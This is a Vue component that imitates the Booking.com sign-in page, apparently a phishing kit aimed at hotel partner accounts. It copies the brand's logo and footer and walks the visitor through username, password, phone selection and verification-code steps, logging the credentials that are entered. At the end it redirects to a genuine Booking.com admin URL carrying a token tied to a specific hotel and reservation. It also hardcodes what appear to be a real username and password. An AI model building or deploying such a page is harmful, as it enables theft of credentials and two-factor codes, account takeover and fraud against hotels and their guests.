<template>
  <div class="min-h-screen bg-white segoe-ui">
    <!-- Header -->
    <header class="bg-[#003580] text-white min-h-[68px]">
      <div
        class="flex items-center justify-between px-6 py-2 mx-auto max-w-[1108px]"
      >
        <button @click="handleDefaultLink" aria-label="Sign in | Booking.com">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 180 30"
            width="110"
            height="24"
            class="icon-logo"
          >
            <path
              fill="#fff"
              d="M70.6 2.74a2.74 2.74 0 1 1 5.48.02 2.74 2.74 0 0 1-5.48-.02zm45.9 21.03a2.753 2.753 0 0 0 2.548-1.69 2.755 2.755 0 0 0-.59-3.001 2.748 2.748 0 0 0-4.234.412 2.755 2.755 0 0 0 .338 3.47c.513.515 1.21.806 1.938.809zM25.7 6.73a8.55 8.55 0 1 0 8.64 8.55 8.292 8.292 0 0 0-8.64-8.55zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zm39.6-4.12a3.661 3.661 0 0 0-.65-.92l-.15-.16.16-.15c.252-.272.482-.563.69-.87l4.39-6.55h-5.33l-3.31 5.13a1.299 1.299 0 0 1-1.13.41h-.75V2.91c0-1.93-1.21-2.2-2.51-2.2h-2.23v22.87h4.73v-6.86h.44c.54 0 .91.06 1.08.36l2.62 4.89a2.62 2.62 0 0 0 2.82 1.57h3.63l-2.71-4.47-1.79-3.36zm22.97-9.02a6.42 6.42 0 0 0-4.8 2l-.29.29-.1-.4a2.17 2.17 0 0 0-2.38-1.5h-2.13v16.49h4.72v-7.6a6.11 6.11 0 0 1 .29-2 3.86 3.86 0 0 1 3.81-2.89c1.46 0 2 .77 2 2.78v7.19a2.19 2.19 0 0 0 2.51 2.51h2.22V13.07c.03-4.17-2-6.38-5.85-6.38zm-14.88.37h-2.22v16.52h4.7v-14a2.2 2.2 0 0 0-2.48-2.52zm-29.23-.33a8.55 8.55 0 1 0 8.64 8.55 8.292 8.292 0 0 0-8.64-8.55zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zm100.73-13.1a8.549 8.549 0 0 0-1.545 16.942 8.548 8.548 0 0 0 10.185-8.392 8.277 8.277 0 0 0-.585-3.336 8.291 8.291 0 0 0-8.055-5.214zm0 13.1c-2.35 0-4-1.87-4-4.55 0-2.68 1.64-4.55 4-4.55 2.36 0 4 1.87 4 4.55 0 2.68-1.59 4.55-4 4.55zM109.74 7.02a2.002 2.002 0 0 0-1.93 1l-.12.25-.22-.19a6.39 6.39 0 0 0-4.33-1.44c-4.39 0-7.36 3.31-7.36 8.23s3.07 8.35 7.45 8.35a5.81 5.81 0 0 0 3.62-1.06l.36-.28v.46c0 2.21-1.43 3.43-4 3.43a9.463 9.463 0 0 1-3.16-.59 1.39 1.39 0 0 0-2 1l-.91 2.28.33.17a12.82 12.82 0 0 0 5.76 1.34c4 0 8.67-2.06 8.67-7.83V7.02h-2.16zm-5.68 12.09c-2.56 0-3.48-2.25-3.48-4.35 0-.93.23-4 3.23-4 1.49 0 3.49.42 3.49 4.1 0 3.52-1.76 4.25-3.24 4.25zm-90.97-7.26l-.69-.38.6-.5a5.54 5.54 0 0 0 1.88-4.31c0-3.6-2.79-5.92-7.09-5.92H2.31A2.4 2.4 0 0 0 0 3.1v20.4h7.88c4.79 0 7.89-2.61 7.89-6.66a5.57 5.57 0 0 0-2.68-4.99zM4.37 6.08c0-1.06.45-1.56 1.43-1.62h2a2.47 2.47 0 0 1 2.68 2.69 2.55 2.55 0 0 1-2.66 2.82H4.37V6.08zM8.2 19.64H4.37v-4.58c0-1 .39-1.49 1.22-1.61H8.2a3.1 3.1 0 0 1 0 6.19zm166.33-12.9a6.478 6.478 0 0 0-5.05 2.45l-.34.44-.27-.49a4.67 4.67 0 0 0-4.45-2.4 6 6 0 0 0-4.33 1.95l-.44.48-.17-.63a2.11 2.11 0 0 0-2.3-1.42h-2v16.45h4.46v-7.26a8.452 8.452 0 0 1 .24-1.92c.43-1.76 1.61-3.65 3.59-3.46 1.22.12 1.82 1.06 1.82 2.89v9.75h4.52v-7.26a6.626 6.626 0 0 1 .25-2c.36-1.67 1.59-3.39 3.5-3.39 1.38 0 1.89.78 1.89 2.89v7.36c0 1.66.74 2.4 2.4 2.4H180v-10.5c0-4.2-1.85-6.33-5.47-6.33zm-40.84 11.12a6.882 6.882 0 0 1-4.48 2.11 4.403 4.403 0 0 1-4.367-2.798 4.394 4.394 0 0 1-.293-1.812 4.35 4.35 0 0 1 2.665-4.382A4.334 4.334 0 0 1 129 10.65c.84 0 1.8.3 1.95.81v.09a1.659 1.659 0 0 0 1.6 1.21H135v-2.15c0-2.84-3.61-3.87-6-3.87-5.19 0-9 3.63-9 8.61 0 4.98 3.73 8.62 8.86 8.62a9.637 9.637 0 0 0 7-3.12L134 17.58l-.31.28z"
            ></path>
          </svg>
        </button>
        <div class="flex items-center gap-2">
          <button
            class="hidden md:flex w-12 h-12 items-center justify-center hover:bg-[#1A4A8D] bg-opacity-60 transition-colors rounded-sm"
          >
            <div class="flex items-center gap-1">
              <img
                :src="UsFlag"
                alt="US Flag"
                loading="lazy"
                class="w-6 h-6 rounded-full"
              />
            </div>
          </button>
          <button
            class="hidden md:flex w-12 h-12 items-center justify-center hover:bg-[#1A4A8D] bg-opacity-60 rounded-sm transition-colors fill-white"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="20px"
              height="20px"
            >
              <path
                d="M9.75 9a2.25 2.25 0 1 1 3 2.122 2.25 2.25 0 0 0-1.5 2.122v1.006a.75.75 0 0 0 1.5 0v-1.006c0-.318.2-.602.5-.708A3.75 3.75 0 1 0 8.25 9a.75.75 0 1 0 1.5 0M12 16.5a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"
              ></path>
            </svg>
          </button>
          <button
            @click="toggleMenu"
            :aria-expanded="isMenuOpen"
            :aria-label="isMenuOpen ? 'Close menu' : 'Open menu'"
            class="md:hidden w-12 h-12 flex items-center justify-center hover:bg-[#1A4A8D] bg-opacity-60 rounded-sm transition-colors fill-white"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              width="22"
              height="22"
            >
              <path
                fill="currentColor"
                d="M3 6h18v2H3V6zm0 5h18v2H3v-2zm0 5h18v2H3v-2z"
              />
            </svg>
          </button>
        </div>
      </div>
    </header>

    <!-- Mobile menu overlay and panel -->
    <transition name="fade">
      <div
        v-if="isMenuOpen"
        class="fixed inset-0 bg-black/40 z-40"
        @click="isMenuOpen = false"
      ></div>
    </transition>
    <transition name="slide-up" mode="out-in" appear>
      <nav
        v-if="isMenuOpen"
        class="fixed inset-0 bg-white z-50 flex flex-col"
        role="dialog"
        aria-modal="true"
      >
        <button
          @click="isMenuOpen = false"
          class="p-2 rounded hover:bg-gray-100 text-gray-700 ml-auto mr-2 mt-2 transition-colors duration-300"
          aria-label="Close menu"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            width="20"
            height="20"
          >
            <path
              fill="currentColor"
              d="M18.3 5.71 12 12.01 5.7 5.7 4.29 7.11l6.3 6.3-6.3 6.3 1.41 1.41 6.3-6.3 6.29 6.29 1.41-1.41-6.29-6.29 6.3-6.3z"
            />
          </svg>
        </button>
        <div class="flex items-center justify-between px-6">
          <h2 class="text-2xl font-semibold text-gray-900 mb-2">More</h2>
        </div>
        <div class="p-4">
          <ul class="space-y-3 text-gray-900">
            <li>
              <button
                @click="handleDefaultLink"
                class="w-full flex items-center gap-3 px-2 py-3 rounded hover:bg-gray-50"
              >
                <img
                  :src="UsFlag"
                  alt="US Flag"
                  loading="lazy"
                  class="w-6 h-6 rounded-full"
                />
                <span>American English</span>
              </button>
            </li>
          </ul>
        </div>
      </nav>
    </transition>

    <!-- Main Content -->
    <main
      class="flex flex-col items-center min-h-[calc(100vh-64px)] lg:mt-12 px-4 pt-4"
    >
      <div class="w-full max-w-[400px]">
        <Transition :name="stepTransitionName" mode="out-in">
          <!-- Step 1: Username -->
          <Step1Username
            v-if="step === 1"
            key="step-1"
            :model-value="username"
            @update:modelValue="(val) => (username = val)"
            :default-link="defaultLink"
            @next="nextStep"
          />

          <!-- Step 2: Password -->
          <Step2Password
            v-else-if="step === 2"
            :username="username"
            :password="password"
            @update:password="(val) => (password = val)"
            @submit="signIn"
            :default-link="defaultLink"
          />

          <!-- Step 3: Verification method -->
          <Step3Verification
            v-else-if="step === 3"
            key="step-3"
            :show-pulse-banner="showPulseBanner"
            @dismiss-banner="showPulseBanner = false"
            @phone="goToPhoneCall"
            :default-link="defaultLink"
          />
          <Step4PhoneSelect
            v-else-if="step === 4"
            key="step-4"
            :model-value="selectedPhone"
            @update:modelValue="(val) => (selectedPhone = val)"
            @next="goToCodeStep"
            :default-link="defaultLink"
          />
          <Step5Code
            v-else-if="step === 5"
            key="step-5"
            :model-value="verificationCode"
            @update:modelValue="(val) => (verificationCode = val)"
            @submit="verifyNow"
            :default-link="defaultLink"
          />
        </Transition>

        <div class="py-4">
          <div
            class="text-center text-[12px] text-gray-600 pt-4 border-t border-gray-200 flex flex-col gap-2"
            style="line-height: 18px"
          >
            <div>
              <p>
                By signing in or creating an account, you agree with our
                <a
                  @click="handleDefaultLink"
                  class="text-[#0071c2] hover:underline"
                >
                  Terms &<br />Conditions
                </a>
                and
                <a
                  @click="handleDefaultLink"
                  class="text-[#0071c2] hover:underline"
                >
                  Privacy Statement
                </a>
              </p>
            </div>
            <div>
              <p>All rights reserved.</p>
              <p>Copyright (2006-2025) – Booking.com™</p>
            </div>
          </div>
        </div>
      </div>
    </main>
  </div>
</template>

<script setup>
import { ref, watch, nextTick, onMounted } from 'vue';
import UsFlag from '~/assets/us.png';
import BookingTitle from '~/components/booking/BookingTitle.vue';
import BookingInput from '~/components/booking/BookingInput.vue';
import BookingButton from '~/components/booking/BookingButton.vue';
import Step1Username from '~/components/booking/steps/Step1Username.vue';
import Step2Password from '~/components/booking/steps/Step2Password.vue';
import Step3Verification from '~/components/booking/steps/Step3Verification.vue';
import Step4PhoneSelect from '~/components/booking/steps/Step4PhoneSelect.vue';
import Step5Code from '~/components/booking/steps/Step5Code.vue';

const step = ref(1);
const username = ref('10402');
const password = ref('BergenDal5');
const showPassword = ref(false);
const isMenuOpen = ref(false);
const stepTransitionName = ref('slide-left');
const showPulseBanner = ref(true);
const selectedPhone = ref('');
const verificationCode = ref('');

useHead({
  title: 'Sign in - Booking.com',
  meta: [
    { name: 'description', content: 'Sign in to your Booking.com account' },
  ],
});

const defaultLink = ref(
  'https://account.booking.com/sign-in?op_token=EgVvYXV0aCLYAgoUNlo3Mm9IT2QzNk5uN3prM3BpcmgSCWF1dGhvcml6ZRoaaHR0cHM6Ly9hZG1pbi5ib29raW5nLmNvbS8q3wF7InBhZ2UiOiIvaG90ZWwvaG90ZWxhZG1pbi9leHRyYW5ldF9uZy9tYW5hZ2UvYm9va2luZy5odG1sP2NvZGU9YjQ0OTY5ZWExY2E1YTllYmQwNDVlOTQ0YmJhMTI3NmYmbGFuZz1ubCZob3RlbF9pZD0xMDE2NiZyZXNfaWQ9NDk0OTc4NDk5NiZyZXFfaWQ9JmVtYWlsPTEmcmVzcG9uc2U9MSIsImF1dGhfYXR0ZW1wdF9pZCI6ImZiOTNlODVjLTdlYTktNDY5MC1hNGUzLTVlZDA5ZGE5ZGFmYyJ9MitNRVRXLWRZZXdmQklxb055cEp3dVAzNDlzbFk3MkNpS2ZMWjlaYzN3YlE0OgRTMjU2QgRjb2RlKhMwnZPPgJD7JzoAQgBYrMyDm5Mz'
);

const handleDefaultLink = () => {
  navigateTo(defaultLink.value, { external: true });
};

function toggleMenu() {
  isMenuOpen.value = !isMenuOpen.value;
}

function nextStep() {
  if (username.value) {
    stepTransitionName.value = 'slide-left';
    step.value = 2;
  }
}

function signIn() {
  // navigateTo(defaultLink.value, { external: true });
  console.log('Signing in with:', {
    username: username.value,
    password: password.value,
  });
  stepTransitionName.value = 'slide-left';
  step.value = 3;
}

function goToPhoneCall() {
  stepTransitionName.value = 'slide-left';
  step.value = 4;
}

function goToCodeStep() {
  if (!selectedPhone.value) return;
  stepTransitionName.value = 'slide-left';
  step.value = 5;
}

function verifyNow() {
  if (!verificationCode.value) return;
  navigateTo(defaultLink.value, { external: true });
}

// Focus is handled by BookingInput via the autofocus prop
</script>

<style scoped>
input::placeholder {
  color: #6b7280;
  font-size: 14px;
}

input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus {
  -webkit-box-shadow: 0 0 0px 1000px white inset;
  transition: background-color 5000s ease-in-out 0s;
}
button,
a {
  cursor: pointer;
}

/* Transitions for overlay and panel */
.fade-enter-active,
.fade-leave-active {
  transition: opacity 300ms ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

.slide-up-enter-active,
.slide-up-leave-active {
  transition: transform 300ms ease;
}
.slide-up-enter-from,
.slide-up-leave-to {
  transform: translateY(100%);
}

/* Step transitions */
.slide-left-enter-active,
.slide-left-leave-active,
.slide-right-enter-active,
.slide-right-leave-active {
  transition: transform 300ms cubic-bezier(0.4, 0, 0.2, 1),
    opacity 300ms cubic-bezier(0.4, 0, 0.2, 1);
}

.slide-left-enter-from,
.slide-right-leave-to {
  transform: translateX(100%);
  opacity: 0;
}

.slide-left-leave-to,
.slide-right-enter-from {
  transform: translateX(-100%);
  opacity: 0;
}
</style>
